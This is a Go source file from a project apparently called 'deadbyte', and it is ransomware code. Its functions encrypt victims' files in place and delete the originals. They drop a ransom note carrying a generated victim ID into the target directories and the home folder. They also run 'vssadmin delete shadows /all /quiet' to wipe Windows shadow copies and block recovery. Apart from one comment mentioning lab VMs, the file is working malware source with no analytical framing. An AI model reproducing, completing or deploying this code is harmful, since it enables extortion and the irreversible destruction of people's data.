package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"deadbyte/internal/crypto"
	"deadbyte/internal/rans"
	"deadbyte/internal/types"
)

// Stats tracks encryption progress.
type Stats struct {
	Files  int64
	Bytes  int64
	Errors int64
}

func offlineID() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "OFFLINE-000000"
	}
	return "OFFLINE-" + strings.ToUpper(hex.EncodeToString(b))
}

// encryptOne seals a single file in place (original -> original.deadbyte).
func encryptOne(pubKeyB64, path string, dryRun bool, st *Stats) error {
	if dryRun {
		st.Files++
		return nil
	}
	pub, err := crypto.ParsePubB64(pubKeyB64)
	if err != nil {
		return fmt.Errorf("pubkey: %w", err)
	}
	out := path + types.Ext
	info, err := crypto.EncryptFile(pub, path, out)
	if err != nil {
		st.Errors++
		return err
	}
	if err := os.Remove(path); err != nil {
		os.Remove(out)
		st.Errors++
		return err
	}
	st.Files++
	st.Bytes += info.Size
	return nil
}

// writeNote drops the ransom note into each target root and the home dir.
func writeNote(cfg Config, victimID string) error {
	note := rans.Note(cfg.NoteURL, victimID, "", false)
	roots := strings.Split(cfg.Dirs, ",")
	dirs := append(roots, homeDir())
	for _, d := range dirs {
		if d == "" {
			continue
		}
		p := filepath.Join(d, cfg.NoteName)
		if err := os.WriteFile(p, []byte(note), 0o600); err != nil {
			continue
		}
	}
	return nil
}

func homeDir() string {
	h, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return h
}

// wipeVSS removes Windows Volume Shadow Copies (requires elevation).
func wipeVSS() {
	if runtime.GOOS != "windows" {
		return
	}
	cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	if err := cmd.Run(); err != nil {
		// ignore: requires admin, may fail in lab VMs
	}
}
